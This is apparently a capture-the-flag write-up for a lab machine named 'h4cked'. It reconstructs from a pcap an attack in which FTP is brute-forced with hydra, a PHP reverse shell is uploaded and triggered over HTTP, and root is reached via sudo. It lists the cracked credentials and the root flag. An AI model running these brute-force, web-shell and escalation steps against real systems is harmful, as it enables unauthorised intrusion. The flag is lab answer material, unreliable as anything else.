> h4cked

We got a pcap file and following the TCP stream we can find many details.

1. Attacker tried to enter ftp
2. Tried cracking using hydra
3. Uploaded a shell in ftp 
4. Got a reverse shell
5. Downloaded Reptile rootkit.

# Steps

hydra -l jenny -P /usr/share/wordlists/rockyou.txt -vV $IP ftp

```
[21][ftp] host: 10.10.24.164   login: jenny   password: 987654321
```

Let's get shell.php to local machine and make changes and put it to ftp.

# Nmap

nmap -sC -sV -T4 -Pn -vv -oN nmap/initial $IP

```
21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Accessing `http://10.10.24.164/shell.php` we can get a reverse shell.

su jenny
sudo -l => all
sudo su

We are in as root!!

# root.txt

```
ebcefd66ca4b559d17b440b6e67fd0fd
```